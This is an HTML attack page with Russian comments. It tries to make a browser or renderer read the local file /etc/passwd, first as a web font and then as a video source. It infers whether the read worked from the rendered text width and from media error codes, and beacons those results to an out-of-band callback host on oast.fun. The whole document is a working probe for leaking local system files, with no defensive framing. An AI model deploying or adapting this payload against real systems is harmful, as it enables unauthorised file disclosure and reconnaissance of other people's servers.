<!DOCTYPE html>
<html>
<head>
    <style>
        /* Пытаемся скормить passwd как шрифт */
        @font-face {
            font-family: 'StealFont';
            src: url('file:///etc/passwd');
        }
        #probe {
            font-family: 'StealFont', Arial;
            font-size: 100px;
            position: absolute;
            visibility: hidden;
        }
    </style>
</head>
<body>
    <div id="probe">root</div>
    <script>
        (function() {
            const hook = "https://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun";
            const probe = document.getElementById('probe');
            
            // Ждем чуть-чуть, пока браузер попытается "отрисовать" шрифт
            setTimeout(() => {
                const width = probe.offsetWidth;
                // Отправляем ширину. Если она отличается от стандартного Arial, 
                // значит файл был считан парсером шрифтов!
                navigator.sendBeacon(hook + "/FONT_WIDTH_LEAK", "Width: " + width);
                
                // ВТОРОЙ ШАНС: Пробуем Video/Audio тег (иногда они менее защищены)
                const v = document.createElement('video');
                v.src = "file:///etc/passwd";
                v.onloadedmetadata = () => navigator.sendBeacon(hook + "/VIDEO_METADATA_LEAK");
                v.onerror = (e) => {
                    // Если ошибка 4 (MEDIA_ERR_SRC_NOT_SUPPORTED), файл БЫЛ прочитан
                    navigator.sendBeacon(hook + "/VIDEO_ERROR_CODE", "Code: " + v.error.code);
                };
            }, 1000);
        })();
    </script>
</body>
</html>
